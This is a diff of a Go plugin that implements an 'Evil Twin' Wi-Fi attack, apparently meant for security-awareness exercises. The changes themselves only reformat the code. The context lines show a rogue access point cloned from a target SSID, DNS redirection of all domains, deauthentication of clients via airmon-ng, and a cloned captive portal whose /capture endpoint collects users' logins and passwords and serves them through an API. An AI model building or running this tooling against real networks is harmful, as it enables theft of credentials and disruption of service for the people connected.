@@ -32,33 +32,33 @@ type EvilTwinPlugin struct{}
 
 // CapturedCredential represents a captured login attempt
 type CapturedCredential struct {
-	Timestamp  time.Time `json:"timestamp"`
-	SourceIP   string    `json:"source_ip"`
-	SourceMAC  string    `json:"source_mac,omitempty"`
-	Login      string    `json:"login"`
-	Password   string    `json:"password"`
-	UserAgent  string    `json:"user_agent"`
-	ExtraData  string    `json:"extra_data,omitempty"`
+	Timestamp time.Time `json:"timestamp"`
+	SourceIP  string    `json:"source_ip"`
+	SourceMAC string    `json:"source_mac,omitempty"`
+	Login     string    `json:"login"`
+	Password  string    `json:"password"`
+	UserAgent string    `json:"user_agent"`
+	ExtraData string    `json:"extra_data,omitempty"`
 }
 
 // EvilTwinState holds the current state of the attack
 type EvilTwinState struct {
-	mu              sync.Mutex
-	Running         bool                 `json:"running"`
-	Phase           string               `json:"phase"` // idle, cloning, deauth, serving
-	TargetSSID      string               `json:"target_ssid"`
-	TargetBSSID     string               `json:"target_bssid"`
-	TargetChannel   int                  `json:"target_channel"`
-	FakeSSID        string               `json:"fake_ssid"`
-	Interface       string               `json:"interface"`
-	MonitorIface    string               `json:"monitor_iface"`
-	ClonedPortalDir string               `json:"cloned_portal_dir"`
-	StartedAt       time.Time            `json:"started_at"`
-	Credentials     []CapturedCredential `json:"credentials"`
-	ConnectedClients int                 `json:"connected_clients"`
-	DeauthSent      int                  `json:"deauth_sent"`
-	Error           string               `json:"error,omitempty"`
-	
+	mu               sync.Mutex
+	Running          bool                 `json:"running"`
+	Phase            string               `json:"phase"` // idle, cloning, deauth, serving
+	TargetSSID       string               `json:"target_ssid"`
+	TargetBSSID      string               `json:"target_bssid"`
+	TargetChannel    int                  `json:"target_channel"`
+	FakeSSID         string               `json:"fake_ssid"`
+	Interface        string               `json:"interface"`
+	MonitorIface     string               `json:"monitor_iface"`
+	ClonedPortalDir  string               `json:"cloned_portal_dir"`
+	StartedAt        time.Time            `json:"started_at"`
+	Credentials      []CapturedCredential `json:"credentials"`
+	ConnectedClients int                  `json:"connected_clients"`
+	DeauthSent       int                  `json:"deauth_sent"`
+	Error            string               `json:"error,omitempty"`
+
 	// Process handles
 	hostapdCmd   *exec.Cmd
 	dnsmasqCmd   *exec.Cmd
@@ -75,9 +75,11 @@ func init() {
 	plugins.Register(&EvilTwinPlugin{})
 }
 
-func (p *EvilTwinPlugin) Key() string         { return "eviltwin" }
-func (p *EvilTwinPlugin) Version() string     { return "1.0.0" }
-func (p *EvilTwinPlugin) Description() string { return "Attaque Evil Twin - Clone de portail captif pour sensibilisation" }
+func (p *EvilTwinPlugin) Key() string     { return "eviltwin" }
+func (p *EvilTwinPlugin) Version() string { return "1.0.0" }
+func (p *EvilTwinPlugin) Description() string {
+	return "Attaque Evil Twin - Clone de portail captif pour sensibilisation"
+}
 
 func (p *EvilTwinPlugin) Manifest() map[string]any {
 	return map[string]any{
@@ -99,7 +101,7 @@ func (p *EvilTwinPlugin) RegisterRoutes(app *buffalo.App, deps plugins.Deps) {
 	app.POST("/deauth", p.SendDeauth)
 	app.POST("/report/generate", p.GenerateReport)
 	app.GET("/interfaces", p.GetInterfaces)
-	
+
 	// Endpoint pour capturer les credentials (appelé par le portail cloné)
 	app.POST("/capture", p.CaptureCredentials)
 }
@@ -129,11 +131,11 @@ func (p *EvilTwinPlugin) View(c buffalo.Context) error {
 
 	if running {
 		statusData := []map[string]any{{
-			"phase":      phase,
-			"target":     targetSSID,
-			"clients":    connectedClients,
-			"deauth":     deauthSent,
-			"captured":   credsCount,
+			"phase":    phase,
+			"target":   targetSSID,
+			"clients":  connectedClients,
+			"deauth":   deauthSent,
+			"captured": credsCount,
 		}}
 		statusCols := []ui.TableColumn{
 			{Key: "phase", Label: "Phase", Render: "badge"},
@@ -257,13 +259,13 @@ type WiFiInterface struct {
 
 func getWiFiInterfaces() []WiFiInterface {
 	interfaces := []WiFiInterface{}
-	
+
 	// List wireless interfaces
 	out, err := exec.Command("iw", "dev").Output()
 	if err != nil {
 		return interfaces
 	}
-	
+
 	lines := strings.Split(string(out), "\n")
 	var current WiFiInterface
 	for _, line := range lines {
@@ -284,7 +286,7 @@ func getWiFiInterfaces() []WiFiInterface {
 	if current.Name != "" {
 		interfaces = append(interfaces, current)
 	}
-	
+
 	return interfaces
 }
 
@@ -452,7 +454,7 @@ func runEvilTwinAttack(iface, targetSSID, targetBSSID string, channel int, fakeS
 
 	// Stop NetworkManager control of interface
 	exec.Command("nmcli", "device", "set", iface, "managed", "no").Run()
-	
+
 	// Set channel
 	exec.Command("ip", "link", "set", iface, "down").Run()
 	exec.Command("iwconfig", iface, "channel", fmt.Sprintf("%d", channel)).Run()
@@ -483,7 +485,7 @@ wpa=0
 	state.mu.Lock()
 	state.hostapdCmd = exec.Command("hostapd", confPath)
 	state.mu.Unlock()
-	
+
 	if err := state.hostapdCmd.Start(); err != nil {
 		state.mu.Lock()
 		state.Error = fmt.Sprintf("Erreur hostapd: %v", err)
@@ -539,7 +541,7 @@ address=/#/10.0.0.1
 		state.mu.Lock()
 		state.Phase = "deauthing"
 		state.mu.Unlock()
-		
+
 		go runDeauthLoop(iface, targetBSSID, deauthInterval)
 	}
 
@@ -554,10 +556,10 @@ address=/#/10.0.0.1
 func runDeauthLoop(iface, targetBSSID string, interval int) {
 	// Need a separate monitor interface for deauth
 	monIface := iface + "mon"
-	
+
 	// Try to create monitor interface
 	exec.Command("airmon-ng", "start", iface).Run()
-	
+
 	ticker := time.NewTicker(time.Duration(interval) * time.Second)
 	defer ticker.Stop()
 
@@ -579,15 +581,15 @@ func runDeauthLoop(iface, targetBSSID string, interval int) {
 
 func startCaptivePortalServer(portalDir string) {
 	mux := http.NewServeMux()
-	
+
 	// Serve static files
 	mux.Handle("/", http.FileServer(http.Dir(portalDir)))
-	
+
 	// Capture endpoint
 	mux.HandleFunc("/capture", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method == "POST" {
 			r.ParseForm()
-			
+
 			// Extract credentials
 			login := r.FormValue("login")
 			if login == "" {
@@ -599,7 +601,7 @@ func startCaptivePortalServer(portalDir string) {
 			if login == "" {
 				login = r.FormValue("code")
 			}
-			
+
 			password := r.FormValue("password")
 			if password == "" {
 				password = r.FormValue("pass")
@@ -746,7 +748,7 @@ func (p *EvilTwinPlugin) StopAttack(c buffalo.Context) error {
 func (p *EvilTwinPlugin) GetStatus(c buffalo.Context) error {
 	state.mu.Lock()
 	defer state.mu.Unlock()
-	
+
 	return writeJSON(c, 200, map[string]any{
 		"running":           state.Running,
 		"phase":             state.Phase,
@@ -764,7 +766,7 @@ func (p *EvilTwinPlugin) GetCredentials(c buffalo.Context) error {
 	state.mu.Lock()
 	creds := append([]CapturedCredential{}, state.Credentials...)
 	state.mu.Unlock()
-	
+
 	return writeJSON(c, 200, map[string]any{"credentials": creds})
 }
 
